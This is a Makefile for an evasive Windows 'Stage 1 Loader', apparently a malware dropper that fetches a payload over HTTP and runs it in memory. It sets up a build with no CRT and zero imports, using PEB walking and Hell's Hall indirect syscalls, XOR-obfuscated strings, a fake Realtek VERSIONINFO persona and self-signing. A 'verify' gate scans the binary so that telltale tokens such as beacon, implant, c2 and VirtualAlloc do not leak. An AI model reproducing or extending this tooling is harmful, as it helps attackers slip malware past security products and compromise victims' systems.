# Stage 1 Loader Makefile.
#
# Targets:
#   make linux         - Linux ELF (development iteration only)
#   make windows       - Windows PE via mingw-w64 (the real deliverable)
#   make all           - both
#   make verify        - S33 static cleanliness gate (strings/IAT/size)
#   make s34_verify    - S34 extension: VERSIONINFO + signature + W^X hygiene
#   make sign          - self-sign build/stage1.exe via sign.sh
#   make check         - verify binary size constraint
#   make clean         - remove build/
#
# Windows target: freestanding build. No CRT. No default libraries.
# Entry point = stage1_entry in src/main.c.
# S34 IAT goal: zero imports (ntdll resolved via PEB, Nt* via Hell's Hall).

BUILD_DIR := build
RES_DIR   := resources

# Shared across platforms
SHARED_SRCS := src/main.c src/xor.c

# Linux-specific
LINUX_SRCS := $(SHARED_SRCS) src/http_linux.c src/mem_exec_linux.c

# Windows-specific (S33 + S34 syscall layer)
WIN_SRCS := $(SHARED_SRCS) \
            src/http_win.c src/mem_exec_win.c \
            src/peb_walk.c src/api_table.c src/xor_string.c \
            src/syscalls.c

# Windows resource file (S34 cosmetic layer)
WIN_RC     := $(RES_DIR)/stage1.rc
WIN_RES_O  := $(BUILD_DIR)/stage1_res.o

COMMON_CFLAGS := -Os -fno-stack-protector -fno-asynchronous-unwind-tables \
                 -fno-ident -fno-exceptions -fdata-sections -ffunction-sections \
                 -Wall -Wextra -Werror -Isrc

# Linux
CC := gcc
LINUX_CFLAGS := $(COMMON_CFLAGS)
LINUX_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all -s

# Windows: freestanding -- no CRT, no default libs, custom entry.
# -fno-builtin-mem{cpy,set} blocks the compiler from emitting calls to
# memcpy/memset on aggregate copies (we have no libc to satisfy them).
# S34: no -fcf-protection=full; MinGW default is already non-/CETCOMPAT
# which is the correct stance for a loader that must survive shadow-stack
# compat-mode mismatches (see win11-24h2-syscall-stability research).
MINGW := x86_64-w64-mingw32-gcc
MINGW_WINDRES := x86_64-w64-mingw32-windres
MINGW_OBJDUMP := x86_64-w64-mingw32-objdump
MINGW_OBJCOPY := x86_64-w64-mingw32-objcopy
WIN_CFLAGS := $(COMMON_CFLAGS) -ffreestanding \
              -fno-builtin-memcpy -fno-builtin-memset \
              -mno-stack-arg-probe
WIN_LDFLAGS := -nostdlib -nodefaultlibs -nostartfiles \
               -Wl,--entry=stage1_entry \
               -Wl,--gc-sections -Wl,--strip-all -s -lkernel32

# S34 size ceiling -- raised from S33's 20 KB to accommodate .rsrc section
# (~5 KB for VERSIONINFO + manifest + icon).
MAX_SIZE := 22528

LINUX_OUT := $(BUILD_DIR)/stage1
WIN_OUT := $(BUILD_DIR)/stage1.exe

# Forbidden-token regex for `make verify`. Keep in sync with plan / README.
FORBIDDEN := '(oxide|beacon|stage|implant|c2|http://|https://|User-Agent|Mozilla|VirtualAlloc|LoadLibrary|GetProcAddress|wininet|InternetOpen|kernel32|ntdll|OXID|/api/|NtAllocate|NtProtect)'

.PHONY: all linux windows clean check verify s34_verify sign

all: linux windows

linux: $(BUILD_DIR)
	$(CC) $(LINUX_CFLAGS) $(LINUX_SRCS) -o $(LINUX_OUT) $(LINUX_LDFLAGS)
	@echo "Built: $(LINUX_OUT)"
	@stat -c "Size: %s bytes" $(LINUX_OUT)

windows: $(BUILD_DIR) $(WIN_RES_O)
	@if command -v $(MINGW) >/dev/null 2>&1; then \
		$(MINGW) $(WIN_CFLAGS) $(WIN_SRCS) $(WIN_RES_O) -o $(WIN_OUT) $(WIN_LDFLAGS); \
		echo "Built: $(WIN_OUT)"; \
		stat -c "Size: %s bytes" $(WIN_OUT); \
	else \
		echo "SKIP: mingw-w64 not installed (pacman -S mingw-w64-gcc)"; \
		exit 1; \
	fi

# Compile the resource file via windres. Output is a COFF object linkable
# alongside normal .o files; produces .rsrc section in the final PE.
$(WIN_RES_O): $(WIN_RC) $(BUILD_DIR)
	@if command -v $(MINGW_WINDRES) >/dev/null 2>&1; then \
		$(MINGW_WINDRES) -I $(RES_DIR) -i $(WIN_RC) -O coff -o $(WIN_RES_O); \
		echo "Compiled resource: $(WIN_RES_O)"; \
	else \
		echo "SKIP: mingw-w64 windres not installed"; \
		exit 1; \
	fi

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

clean:
	rm -rf $(BUILD_DIR)

# Size gate
check: all
	@echo "Checking size constraints..."
	@WIN_SIZE=$$(stat -c %s $(WIN_OUT) 2>/dev/null || echo 0); \
	if [ "$$WIN_SIZE" -gt $(MAX_SIZE) ]; then \
		echo "FAIL: Windows binary ($$WIN_SIZE) exceeds $(MAX_SIZE) bytes"; \
		exit 1; \
	else \
		echo "PASS: Windows binary ($$WIN_SIZE) <= $(MAX_SIZE) bytes"; \
	fi

# Static-cleanliness gate (S33 legacy) -- run after `make windows`.
# Scope: code/data sections only. .rsrc contains the manifest schema URL
# plus VERSIONINFO strings (Realtek persona) which are expected and legit.
# Uses objcopy to extract raw section bytes, avoiding hex-dump artifacts
# that confuse `strings` when reading objdump -s output.
verify: $(WIN_OUT)
	@echo "=== strings leak scan (.text/.rdata/.data only) ==="
	@$(MINGW_OBJCOPY) -O binary --only-section=.text --only-section=.rdata \
	    --only-section=.data $(WIN_OUT) $(BUILD_DIR)/_sections.bin 2>/dev/null
	@LEAKS=$$(strings -n 5 $(BUILD_DIR)/_sections.bin | \
	           grep -iE $(FORBIDDEN) || true); \
	rm -f $(BUILD_DIR)/_sections.bin; \
	if [ -n "$$LEAKS" ]; then \
		echo "FAIL: forbidden tokens in $(WIN_OUT):"; \
		echo "$$LEAKS"; \
		exit 1; \
	else \
		echo "PASS: no forbidden tokens"; \
	fi
	@echo
	@echo "=== IAT inspection ==="
	@$(MINGW_OBJDUMP) -p $(WIN_OUT) | awk '/DLL Name:/ {print} /\sExitProcess|\sLoadLibrary|\sVirtual|\sInternet/ {print}'
	@echo
	@echo "=== size ==="
	@stat -c "%s bytes" $(WIN_OUT)

# S34 extension: VERSIONINFO + signature + W^X hygiene.
# Graceful degradation -- warns if wrestool/osslsigncode absent.
s34_verify: $(WIN_OUT)
	@echo "=== no syscall opcode in stage1 own .text ==="
	@COUNT=$$($(MINGW_OBJDUMP) -d $(WIN_OUT) | grep -cE '\bsyscall\b' || true); \
	if [ "$$COUNT" -ne 0 ]; then \
		echo "FAIL: stage1.exe disassembly contains $$COUNT syscall opcode(s)"; \
		exit 1; \
	else \
		echo "PASS: no syscall opcodes emitted in stage1.exe"; \
	fi
	@echo
	@echo "=== DllCharacteristics (CET should be absent) ==="
	@$(MINGW_OBJDUMP) -p $(WIN_OUT) | grep -A1 'DllCharacteristics' || true
	@echo
	@echo "=== VERSIONINFO ==="
	@if command -v wrestool >/dev/null 2>&1; then \
		wrestool -x -t 16 --raw $(WIN_OUT) 2>/dev/null | strings -el | head -20 || \
			echo "  (no VS_VERSION_INFO found)"; \
	else \
		echo "  (wrestool not installed -- pacman -S icoutils)"; \
	fi
	@echo
	@echo "=== Authenticode signature ==="
	@if command -v osslsigncode >/dev/null 2>&1; then \
		osslsigncode verify $(WIN_OUT) 2>&1 | grep -E 'Signature|Signer|CN=|verified' || echo "  (no signature)"; \
	else \
		echo "  (osslsigncode not installed -- pacman -S osslsigncode)"; \
	fi

# Self-sign via sign.sh (idempotent; regenerates cert only if missing).
sign: $(WIN_OUT)
	@./sign.sh $(WIN_OUT)
